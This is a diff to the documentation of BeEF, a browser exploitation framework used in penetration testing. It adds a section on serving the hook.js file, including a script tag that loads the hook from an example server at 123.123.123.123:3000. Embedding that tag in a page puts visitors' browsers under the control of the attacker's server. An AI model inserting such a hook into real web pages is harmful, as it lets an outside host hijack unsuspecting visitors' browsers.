@@ -84,6 +84,15 @@ By default, the administration UI throttles login attempts to 1 attempt per seco
 
 By default, the REST API interface throttles login attempts to 1 attempt every 0.05 seconds. This can be changed altering `beef.restrictions.api_attempt_delay` value in [`config.yaml`](https://github.com/beefproject/beef/blob/master/config.yaml).
 
+## How to include the hook to a server
+
+The dynamically generated JavaScript hook file hook.js is automatically mounted at /hook.js.
+
+If your BeEF server is 123.123.123.123:3000 then you can include the script using a HTML script tag like so:
+
+<script src="http://123.123.123.123:3000/hook.js"></script>
+
+
 ## Web Server Configuration
 
 The web server can be fully configured, this is done in the HTTP subsection of the [`config.yaml`](https://github.com/beefproject/beef/blob/master/config.yaml) file:
